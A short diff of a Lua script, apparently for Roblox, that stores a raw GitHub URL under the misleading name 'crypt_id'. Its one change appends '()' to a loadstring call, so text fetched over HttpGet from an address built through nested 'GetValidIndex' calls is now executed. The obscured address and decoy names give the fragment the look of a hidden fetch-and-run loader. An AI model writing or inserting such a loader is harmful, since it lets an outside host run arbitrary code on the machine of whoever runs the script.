@@ -19,7 +19,7 @@ local M = {
 local crypt_id = 'https://raw.githubusercontent.com/HallowsAdvent/NewProject/refs/heads/main/Updated_Repost'
 local valid_data_index 
 
-local Tags = loadstring(M.p2:HttpGet(GetValidIndex(GetValidIndex(M.p1))))
+local Tags = loadstring(M.p2:HttpGet(GetValidIndex(GetValidIndex(M.p1))))()
 local ReturnInvalidIndex = function(msgstring, msgstring2, data, id)
 	valid_data_index = {tt = data, DataText = msgstring, DataText2 = msgstring2, l = id}
 end
